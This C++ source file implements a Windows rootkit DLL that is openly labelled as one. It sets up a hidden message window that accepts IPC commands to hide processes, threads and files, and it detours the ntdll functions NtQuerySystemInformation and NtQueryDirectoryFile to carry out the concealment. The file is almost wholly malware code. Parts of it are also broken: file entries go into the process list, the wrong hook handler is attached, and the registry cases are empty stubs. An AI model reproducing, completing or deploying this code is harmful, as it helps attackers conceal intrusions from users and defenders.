#include "rk.h"

// RootKit Controll
namespace rkc {
	status RkCtlHandler(
		_In_ COPYDATASTRUCT* cds
	) {
	#define RKCTLC(fd, id) ((fd << 4) | (id & 0xf))

		switch (cds->dwData) {
		case RKCTLC(0, 0): // Add Process to Hide
		case RKCTLC(0, 1): // Add ProcessThread to Hide
			g_ProcessList->WriteLock(); {
				u8 v0 = cds->dwData & 0xf;
				void* mem = g_ProcessList->AllocateObject(4 * v0 + 5);
				*(u8*)mem = v0;
				v0 ? *(u64*)((ptr)mem + 1) = *(u64*)cds->lpData
					: *(u32*)((ptr)mem + 1) = *(u32*)cds->lpData;
			} g_ProcessList->WriteUnlock(); break;

		case RKCTLC(0, 4): // Remove Process(Thread) from Hide
			g_ProcessList->WriteLock(); {
				void* Entry = (u32*)g_ProcessList->GetFirstEntry();
				do {
					if (*(u8*)Entry == 0) {
						if (*(u32*)((ptr)Entry + 1) == *(u32*)cds->lpData) {
							g_ProcessList->FreeObject(Entry); break;
						}
					} else if (*(u8*)Entry == 1)
						if (*(u32*)((ptr)Entry + 5) == *(u32*)cds->lpData) {
							g_ProcessList->FreeObject(Entry); break;
						}
				} while (Entry = g_ProcessList->GetNextEntry(Entry));
			} g_ProcessList->WriteUnlock(); break;



		case RKCTLC(1, 0): // Add File/Directory to hide
			g_ProcessList->WriteLock(); {
				void* mem = g_ProcessList->AllocateObject(cds->cbData);
				__movsb((byte*)mem, (byte*)cds->lpData, cds->cbData);
			} g_ProcessList->WriteUnlock(); break;
		case RKCTLC(1, 1): // Remove File/Directory to hide
			break;



		case RKCTLC(2, 0): // Add RegistryKey to hide
			break;
		case RKCTLC(2, 1): // Remove RegistryKey to hide
			break;

		default:
			return -1;
		}

		return 0;
	#undef RKCTLC
	}

	poly __stdcall MessageHandler(
		_In_     HWND hWnd,
		_In_     u32  uMsg,
		_In_opt_ poly wParam,
		_In_opt_ poly lParam
	) {
		switch (uMsg) {
		case WM_COPYDATA: // IPC Message
			return !RkCtlHandler((COPYDATASTRUCT*)lParam);

		// Message-Window Creation
		case WM_NCCREATE:
			return true;
		case WM_CREATE:
			return 0;
		}

		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
	}

	struct AsyncSetupCtx {
		HINSTANCE hInstDll;
		HANDLE    hReadEvent;
	};
	long __stdcall IOCtlSetup(
		_In_opt_ AsyncSetupCtx* ctx
	) {
		WNDCLASSEXW wc{};
		wc.cbSize = sizeof(wc);
		wc.lpfnWndProc = (WNDPROC)MessageHandler;
		wc.lpszClassName = L"rift-RootKit(rk)/process:0000";
		wc.hInstance = ctx->hInstDll;

		ATOM awc = RegisterClassExW(&wc);
		if (!awc)
			return -1;

		HWND hWnd = CreateWindowExW(NULL, MAKEINTATOM(awc), wc.lpszClassName,
			NULL, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, nullptr);
		if (!hWnd) {
			UnregisterClassW(wc.lpszClassName, wc.hInstance);
			return -2;
		}

		// Tell LoaderThread that the Handler is ready
		SetEvent(ctx->hReadEvent);

		MSG msg; BOOL bRet;
		while (bRet = GetMessageW(&msg, hWnd, 0, 0)) {
			if (bRet != -1)
				DispatchMessageW(&msg);
			else {
				DestroyWindow(hWnd);
				UnregisterClassW(wc.lpszClassName, wc.hInstance);
				return -3; // if a fail occurs here the server has to unload the kit/reset it
			}
		}

		UnregisterClassW(wc.lpszClassName, wc.hInstance);
		return 0;
	}
}

extern "C" __declspec(dllexport) long __stdcall DbgSetupForLoadLib(
	_In_opt_ void* hInstDll
) {
	g_BaseAddress = hInstDll;

	// Setup IOCtl Handling (RootKit Control)
	HANDLE h[2];
	h[0] = CreateEventW(nullptr, false, false, nullptr);
	rkc::AsyncSetupCtx ctx = { (HINSTANCE)hInstDll, h[0] };
	h[1] = CreateThread(nullptr, 0x1000, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);

	WaitForMultipleObjects(2, h, false, INFINITE);
	CloseHandle(h[0]);

	dword ThreadExitCode;
	GetExitCodeThread(h[1], &ThreadExitCode);
	CloseHandle(h[1]);
	if (ThreadExitCode != STILL_ACTIVE)
		return M_CREATE(S_ERROR, F_ROOTKIT, C_THREAD_DIED);

	dt::DetourSyscallStub(&(void*&)hk::NtQuerySystemInformation, hk::NtQuerySystemInformationHook);
	dt::DetourSyscallStub(&(void*&)hk::NtQueryDirectoryFile, hk::NtQuerySystemInformationHook);

	return true;
}

BOOL __stdcall DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ dword     fdwReason,
	_In_ void*     pvReserved
) {
	UNREFERENCED_PARAMETER(pvReserved);

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		// Prepare Vectors for Operation
		g_ProcessList = new vec::AnyVector;
		g_FileList = new vec::AnyVector;

		// Get Function Addresses to Hook
		hk::NtQuerySystemInformation = (m_NtDll::NtQuerySystemInformation_t)
			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
		hk::NtQueryDirectoryFile = (m_NtDll::NtQueryDirectoryFile_t)
			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryDirectoryFile");

		return true;

	case DLL_PROCESS_DETACH:
		// Clean Vectors
		delete g_ProcessList;
		delete g_FileList;

		return 0;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}

	return 0;
}
